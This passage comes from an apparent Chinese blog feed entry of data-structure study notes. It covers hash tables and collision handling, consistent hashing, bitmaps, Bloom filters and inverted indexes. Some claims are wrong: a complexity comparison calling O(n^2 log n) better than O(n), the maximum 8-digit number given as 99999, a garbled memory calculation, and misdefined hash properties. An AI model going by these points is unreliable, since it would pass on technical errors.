class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.*s\n&quot;</span>, maxlen, a [maxi]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间复杂度分析：处理过程为先对一个字符串生成相应的后缀数组，然后再排序，排完序依次检测相邻的两个字符串的开头公共部分，其中生成后缀数组时间复杂度为$O(n)$，排序时间复杂度为$O(nlogn<em>n)$，依次检测相邻的两个字符串时间复杂度为$O(n^2)$，故总的时间复杂度是$O(n^2</em>logn)$，优于第一种方法的$O(n)$。</p><h3 id="6-5-哈希表-重点"><a href="#6-5-哈希表-重点" class="headerlink" title="6.5 哈希表(重点)"></a>6.5 哈希表(重点)</h3><h4 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h4><p>哈希表，也叫散列表，它是基于快速存取的角度设计的，是一种典型的“空间换时间”的做法。哈希表是普通数组的一种推广，因为数组可以直接寻址，故可在$O(1)$时间内访问数组的任意元素。</p><p>哈希表是根据关键字(Key value)而直接进行访问的数据结构。它将关键字通过某种规则映射到数组中某个位置，以加快查找的速度。这个映射规则称为<strong>哈希函数</strong>（散列函数），<u>存放记录的数组称为 <strong>哈希表</strong></u>。哈希表建立了关键字和存储地址之间的一种直接映射关系。</p><p>若多个不同的关键字通过哈希函数计算得到相同的数组下标，称其发生了 <strong>冲突（碰撞）</strong>，这些发生冲突的不同关键字称为 <strong>同义词</strong>。一方面，设计好的Hash函数应尽量减少这样的冲突；另一方面，由于这样的冲突总是不可避免的，所以还要设计好处理冲突的方法。</p><h4 id="hash函数"><a href="#hash函数" class="headerlink" title="hash函数"></a>hash函数</h4><p>如果两个散列值是不相同的(根据同一函数)，那么这两个散列值的原始输入也是不相同的。这个特性使散列函数具有确定性的结果，具有这种性质的散列函数称为 <strong>单向散列函数</strong>。</p><p>典型的散列函数都有<strong>无限定义域</strong>，比如任意长度的字节字符串，和<strong>有限的值域</strong>，比如固定长度的比特串。</p><p>典型的哈希算法包括MD4、MD5和SHA-1，MD5和SHA-1 (安全哈希算法)可以说是目前应用最广泛的Hash算法，而它们都是以MD4为基础设计的。</p><ul><li><p><strong>MD4</strong></p><p>MD是Message Digest的缩写。MD4的摘要长度为<strong>128位</strong>比特，可以用来表示32位的十六进制数字，适用于32位字长的处理器。</p></li><li><p><strong>MD5</strong></p><p>MD5是一种面向工业标准的hash方案，摘要长度为<strong>128位</strong>比特。MD5比MD4要复杂，所以速度也更慢一些，但是更安全，在抗分析和抗差分方面表现更好。</p></li><li><p><strong>SHA-1</strong></p><p>SHA-1是由美国国家安全局(NSA)设计，美国国家标准与技术研究院(NIST)发布的密码散列函数，SHA-1会从一个最大$2^{64}$位元的信息中产生一串<strong>160位</strong>元的摘要，SHA-1设计时基于和MD4相同原理，并且模仿了该算法。</p></li></ul><p>hash函数的应用包括：文件校验、数字签名、鉴权协议。<u>hash函数不能用来加密</u>。</p><h4 id="处理冲突（碰撞）的方法"><a href="#处理冲突（碰撞）的方法" class="headerlink" title="处理冲突（碰撞）的方法"></a>处理冲突（碰撞）的方法</h4><p>任何哈希函数都不可能绝对地避免冲突，为此必须考虑冲突发生时应如何进行处理，即为产生冲突的关键字寻找下一个“空”的Hash地址，于是提出了处理冲突的各种方法。</p><ul><li><p><strong>链地址法</strong>（hash值对应一个链表，存放多个记录）</p><p>链地址法是指把所有的冲突关键字（同义词）存储在一个线性链表中，这个链表由其散列地址唯一标识。</p></li><li><p><strong>开放定址法</strong>（在冲突hash值基础上增量）</p><p>开放定址法是指可存放新表项的空闲地址，既向它的同义词表项开放，又向它的非同义词表项开放。一个地址往后的空间按照增量大小依次存放多个hash值。其数学递推公式为（$H_i$表示冲突发生后第$i$次探测的散列地址）：<br>$$<br>H_i&#x3D;(H(key)+d_i)%m<br>$$<br>式中，$i&#x3D;1, 2, …, k (k&lt;&#x3D;m-1)$，m为散列表表长，$d_i$为增量序列，$d_i$通常有以下几种取法：</p><p>当$d&#x3D;1, 2, …, m-1$时，称为<strong>线性探测法</strong>。其特点是，冲突发生时顺序查看表中下一个单元，直到找出一个空单元或查遍全表。</p><blockquote><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220721202104217.png" alt="image-20220721202104217"></p></blockquote><p>当$d&#x3D;1^2, -1^2, 2^2, -2^2,…,k^2, -k^2$时，其中k&lt;&#x3D;m&#x2F;2，又为<strong>二次探测法</strong>。</p><p>当$d_i$&#x3D;伪随机数序列时，称为<strong>伪随机探测法</strong>。</p><p>在开放定址的情形下，不能随便删除表中已有元素，因为若删除元素将会截断其他具有相同散列地址的元素的查找地址。所以若想删除一个元素时， 给它做一 个删除标记，进行逻辑删除。但这样做的副作用是，在执行多次删除后，表面上看起来散列表很满，实际上只是逻辑删除，物理上有许多位置没有利用，因此需要定期维护散列表，要把做删除标记的元素物理删除。</p></li><li><p><strong>再散列法</strong></p><p>当发生冲突时，利用另一个哈希函数再次计算一个地址，直到冲突不再发生，这种方法称为再哈希法。</p></li><li><p><strong>建立一个公共溢出区</strong></p><p>一旦由哈希函数得到的地址冲突，就都填入溢出表。</p></li></ul><p>进行hash表的查找时，计算查找成功的平均查找长度ASL时，平均的概念是对表中当前非空元素而言的，并非是整<br>个表长。计算查找失败的平均查找长度ASL时，平均的概念是针对表长。</p><h3 id="6-6-一致性哈希"><a href="#6-6-一致性哈希" class="headerlink" title="6.6 一致性哈希"></a>6.6 一致性哈希</h3><p>如何快速定位数据在集群中的存储位置，关系到集群的性能。</p><h4 id="普通集群"><a href="#普通集群" class="headerlink" title="普通集群"></a>普通集群</h4><p>普通集群把固定的key映射到固定的结点上，结点只存放各自key的数据，如图16-5所示。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220721202502130.png" alt="image-20220721202502130"></p><p>此种方法将key和结点的关系作为一张单独的表格进行维护，当其中一个结点宕机， 结点上的数据需要迁移，此表格也要重新维护。此种方法的问题是，<u>当需要查找某个key值对应的数据时，必须遍历所有表格</u>，直到寻找到存放<br>此key值的结点，然后再去对应结点读取数据，可见<strong>查找速度慢</strong>。</p><h4 id="hash集群"><a href="#hash集群" class="headerlink" title="hash集群"></a>hash集群</h4><p>为了不想维护上节所述的表格，降低复杂性和其他开销，容易想到对数据的key（假设key为整型，如果不是整型，可通过一个哈希函数映射为一个整型）进行哈希（对结点数取模）。</p><p>比如我们原本有四个结点，如图16-6所示。图16-6中，nodeA、 node B等为服务器（结点），key1、key2等为数据的key。可见<u>寻找数据时，只需将key值对结点数取模，然后再去访问对应结点即可</u>。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220721202909733.png" alt="image-20220721202909733"></p><p>此种方法的不足是：假如某个时候其中一个<u>结点宕机</u>了，那这个结点的数据就完全不可用了。如要进行数据迁移的话，因为这时候结点少了，变为3，对key重新模3的话，只能整个集群的数据都<u>重新映射</u>一遍才能达到效果。</p><h4 id="一致性哈希"><a href="#一致性哈希" class="headerlink" title="一致性哈希"></a>一致性哈希</h4><p>一致性哈希是一种哈希算法，在移除或添加一个结点时，它能够尽可能小地改变已存在key的映射关系。</p><p>一致性哈希将整个哈希值空间组织成一个虚拟的圆环，现假设某哈希函数Hash的值空间为0~$2^{32}$-1（即哈希值是一一个32位无符号整型），那么整个哈希空间环如图16-7所示。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220721204212645.png" alt="image-20220721204212645"></p><p><strong>基本思想</strong>：使用相同的哈希算法（即假设的哈希函数Hash）将数据和结点都映射到上图的环形哈希空间中。</p><ul><li><p><strong>把数据映射到Hash空间</strong></p><p>假设有4个数据object1~object4，那么通过哈希函数计算出的哈希值key在环上的分布如图16-8所示。</p></li><li><p><strong>把结点映射到哈希空间</strong></p><p>具体可以选择结点服务器的IP或主机名作为关键字进行哈希，这样每台机器就能确定其在哈希环上的位置。</p><p>假设当前有A, B和C共3台服务器(结点)，那么其映射结果将如图16-9所示，它们在哈希空间中以对应的哈希值排列。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220721204542741.png" alt="image-20220721204542741"></p></li><li><p><strong>把数据映射到结点</strong></p><p>现在结点和数据都已经通过同一个哈希算法Hash映射到哈希数值空间中了，接下来要考虑的就是如何将数据映射到结点上（确定了映射关系，也就确定了存储关系）。<u>在这个环形空间中，如果沿着顺时针方向（当然也可以约定为逆时针）从数据的key值出发，直到遇见一个结点机器，那么就将该数据存储在这个结点上</u>，因为数据和结点的哈希值是固定的，因此这个结点必然是唯一和确定的。这样就确定了一种数据和结点的一对一映射方法。如图16-10所示。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220721205008404.png" alt="image-20220721205008404"></p></li><li><p><strong>移除结点</strong></p><p>考虑假如node B出现问题，根据上面讲到的映射方法，这时受影响的将仅是那些沿node B逆时针遍历直到下一个node (本例为nodeA)之间的数据，即本来映射到node B上的那些数据。</p><p>因此这里仅需要变动数据object4，将其重新映射到nodeC上即可，如图16-11所示。</p></li><li><p><strong>添加结点</strong></p><p>考虑已有nodeA、B、C的情况下，再添加一台新的node D的情况。假设在这个环形哈希空间中，node D被映射在数据object2和object3之间。这时受影响的将仅是那些沿node D逆时针遍历直到下一个node (本例是node B)之间的数据(它们本来是映射到node C)，将这些数据重新映射到node D上即可。因此这里仅需要变动数据object2,将其重新映射到nodeD上，如图16-12所示。</p></li><li><p><strong>虚拟结点</strong></p><p>在上面的例子中，假设仅部署node A和nodeC，那么在4个数据中，node A仅存储了object1，而node C则存储了objec2、object3 和object4，可见<u>分布是很不平衡的</u>。为了解决这种情况，一致性哈希引入了 “虚拟结点”的概念。</p><p>“虚拟结点”(Virtual Node)是实际结点在哈希空间的复制品，一个实际结点对应了若干“虚拟结点”，这个对应个数也称为“复制个数”，“虚拟结点”在哈希空间中以哈希值排列。</p><p>仍以仅部署node A和node C的情况为例，现在我们引入虚拟结点，并设置“复制个数”为2，这就意味着一共会存在4个“虚拟结点”，node A1, node A2代表了node A；node C1，node C2代表了nodeC。假设一种比较理想的情况，参见图16-13。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220721205230497.png" alt="image-20220721205230497"></p><p>此时，数据object1和objec2被映射到了nodeA上，而objec3和object4映射到了nodeC上。平衡性有了很大提高。</p></li></ul><h3 id="6-7-海量数据处理"><a href="#6-7-海量数据处理" class="headerlink" title="6.7 海量数据处理"></a>6.7 海量数据处理</h3><p>所谓海量数据处理，就是基于海量数据的查找、统计、运算等操作。所谓海量数据，就是数据量太大，所以导致要么是<u>无法在较短时间内迅速解决</u>，要么是<u>数据太大导致无法一次性装入内存</u>。从而导致传统的操作无法实现。</p><h4 id="分治——hash映射"><a href="#分治——hash映射" class="headerlink" title="分治——hash映射"></a>分治——hash映射</h4><p>所有散列函数都有抗碰撞性：如果两个散列值是不相同的(根据同一函数)，那么这两个散列值的原始输入也是不相同的。这个特性使散列函数具有确定性的结果。</p><p>在对大文件进行处理时，若文件过大，无法一次性读入内存，可以考虑采取Hash映射的方法将文件中的元素映射到不同小文件中，然后再依次处理各个小文件，最后合并处理结果，这样就降低了问题规模。</p><blockquote><p>top K 问题</p></blockquote><p>在大规模数据处理中，经常会遇到的一类问题：如何寻找出最大的前K个数、或最小的K个数。</p><p>若这些数据能一次性读入内存，快排一次排序是时间复杂度为O(n)的解决办法；</p><p>但当面对着海量数据时，快排的一次划分就不能再使用。但依然可以使用堆（求最大K个数采用小根堆，求最小K个数采用大根堆），时间复杂度为O(nlogk)，空间复杂度为0(1)。故<strong>堆也是海量数据处理经常采用的工具</strong>。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220721211429024.png" alt="image-20220721211429024"></p><p>对单词hash后取余，按余数将文件内的单词分散到多个文件，每个文件大小不超过内存限制。然后按照分治法的思想，在每个小文件内对单词进行频率统计（trie树或者hash_map），然后对每个文件的频率前100的单词进行归并排序。</p><h4 id="Bit-map"><a href="#Bit-map" class="headerlink" title="Bit-map"></a>Bit-map</h4><p>Bit-map的原理就是<u>使用位数组来表示某些元素是否存在</u>，<strong>一个元素对应一位</strong>，由于采用了bit 为单位来存储数据，因此在存储空间方面，可以大大节省，故适用于海量数据的快速查找、判重、删除等。</p><p>假设我们要对值区间为0~7的5个元素(4, 7, 2, 5, 3) 排序(这里假设这些元素没有重复)。那么我们就可以采用Bit-map的方法来达到排序的目的。要表示8个数，我们就只需要8个bit (1Bytes)，首先我们开辟1Byte的空间，bit位依次编号为01234567，将这些空间的所有bit位都置为0，得到00000000。然后遍历待排序表，将元素值所对应的bit位置1，得到00111101。最后依次输出该位为1的编号即可：2, 3, 4, 5, 7。</p><p>位图排序的时间复杂度是O(n)，它是以空间换时间（需要一个n位的串）。</p><p>在程序设计中，经常需要判断集合中是否存在重复的问题，当数据量比较大时，位图法比较适合。</p><blockquote><p>例2：已知某个文件内包含一些电话号码， 每个号码为8位数字，统计不同号码的个数。</p><p>解答：8位数字表示的最大数为99999，可以理解为从0~99999999的数字，一共10的8次方个数字。用bit-map解决，则每个数字对应一个 bit位，所以只需要约12MB（约等于10的8次方）。这样，就用了只有12M左右的内存表示了所有的8位数的电话。依次读入每个电话号码，然后将bitmap相应位置为1，最后统计bit- map中为1的位数即为不同号码的个数。</p></blockquote><p>位图法还可用来快速判断集合中某个数据是否存在。</p><blockquote><p>例3：给40亿个不重复的unsigned int 的整数，没排过序的，然后再给一个数， 如何快速判断这个数是否在40亿个数当中?</p><p>解答：unsigned int最多有$2^{32}$个数，用Bit-map的方法，申请512M (512*20*8&#x3D;$2^{32}$) 的内存，一个bit位代表个unsigned int值。读入40亿个数，设置相应的bit位，读入要查询的数，查看相应bit位是否为1，为1表示存在，为0表示不存在。</p><p>本题若限制进一步节省内存，但可以允许一定的错误率，那么可以采用下节将要介绍的Bloom filter。</p></blockquote><blockquote><p>例4：在2.5亿个整数中找出<strong>只出现一次</strong>的整数，内存不足以容纳这2.5亿个整数。</p><p>方案1：采用2-Bitmap （每个数分配2bit, 00表示不存在，01表示出现一次， 10表示多次，11无意义）进行，共需内存$2^{32}$*2bit&#x3D;1GB内存，其中$2^{32}$是因为整数最多有$2^{32}$个。然后依次扫描这2.5亿个整数，查看Bitmap中对应位，如果是00变01, 01变10，10 保持不变。扫描结束后，查看bitmap，把对应位是01的整数输出即可。</p><p>方案2：也可采用Hash映射的方法，划分成多个小文件。然后在小文件中利用hash_map找出不重复的整数。</p></blockquote><h4 id="Bloom-Filter"><a href="#Bloom-Filter" class="headerlink" title="Bloom Filter"></a>Bloom Filter</h4><p>Bloom Filter（布隆过滤器）可以视为对Bit-map的扩展。Bit-map的作法是申请一个N位（N为集合中最大整数）的数组，然后每一位对应一个特定整数。</p><p>Bloom Filter 的基本原理是<strong>位数组与Hash函数联合使用</strong>，使用多个hash函数将<strong>元素映射到位数组的多个位上，多个置1的位共同表示该元素存在</strong>。具体而言，Bloom Filter 是一个包含了N位的位数组，数组的每一位都初始化为0，然后定义k个不同的Hash函数，每个Hash函数都可以将集合中的元素映射到位数组中的某一位。</p><p>当向集合中 <strong>插入</strong> 一个元素时，根据k个Hash函数可以得到位数组中的k个位，将这些位全部设置为1（如果一个位置多次被置为1，那么只有第一次会起作用，后面几次将没有任何效果）；</p><p>当要 <strong>查询</strong> 某个元素是否属于集合时，就使用k个哈希函数得到此元素对应的k个位，如果所有点都是1，那么元素在集合内（其实是可能在这个集合，因为有可能某个为1的位是被别的元素置1的，所以<u>存在出错的可能</u>）；如果有0，元素则不在集合内。</p><p>Bloom Filter的位数m通常要比集合中的最大元素小得多，可见，Bloom Filter是一种空间效率和时间效率很高的随机数据结构，但这种高效是有一-定代价的：在判断一个元素是否属于某个集合时，有可能会把不属于这个集合的元素误认为属于这个集合。因此，Bloom Filter<u>不适合那些“零错误”应用场合</u>。而在能容忍低错误率的应用场合下，Bloom Filter通过极少的错误换取了存储空间的极大节省。</p><h4 id="倒排索引法"><a href="#倒排索引法" class="headerlink" title="倒排索引法"></a>倒排索引法</h4><p>正向索引是用来存储每个文档所包含的单词的列表，在正向索引中，文档占据了中心的位置，每个文档指向了一个它所包含的索引项的序列。倒排索引则相反，其存储包含某个单词的文档列表。</p><p>倒排索引也常被称为反向索引、置入档案或反向档案，是一种索引方法，被用来存储在全文检索下某个单词在一个文档或者一组文档中的存储位置的映射。它是文档检索系统中最常用的数据结构。</p><p><strong>适用范围</strong>：搜索引擎的关键字查询。</p><p>以英文为例，下面是要被索引的文本：</p><blockquote><p>T0 &#x3D; “it is what it is”<br>T1 &#x3D; “what is it”<br>T2 &#x3D; “it is a banana”</p></blockquote><p>我们就能得到下面的反向文件索引：（0、1、2代表上述3个文本，集合代表出现了该单词的文本）</p><blockquote><p>“a”：{2}<br>“banana”：{2}<br>“is”：{0, 1, 2}<br>“it”：{0, 1, 2}<br>“what”：{0, 1}</p></blockquote><p>那么当用户检索的条件为”what”, “is”和I”it”，则将分别查询这三个关键词对应的文本集合，即{0, 1, 2}、{0, 1, 2}、{0, 1}，然后求对应集合的 <strong>交集</strong>，得到{0, 1}，这样就能确定包含关键字的文本。</p><p>可见，倒排索引在处理复杂的<u>多关键字查询</u>时，可在倒排表中先完成查询的<u>并、交等逻辑运算</u>，得到结果后再对记录进行存取。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;数据结构&quot;&gt;&lt;a href=&quot;#数据结构&quot; class=&quot;headerlink&quot; title=&quot;数据结构&quot;&gt;&lt;/a&gt;数据结构&lt;/h1&gt;&lt;p&gt;&lt;u&gt;&lt;strong&gt;线性表&lt;/strong&gt;&lt;/u&gt;：具有相同特性的数据元素的一个有限序列。&lt;/p&gt;
&lt;p&gt;具有&lt;stro</summary>
      
    
    
    
    
    <category term="计算机基础" scheme="https://frankcao3.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
</feed>
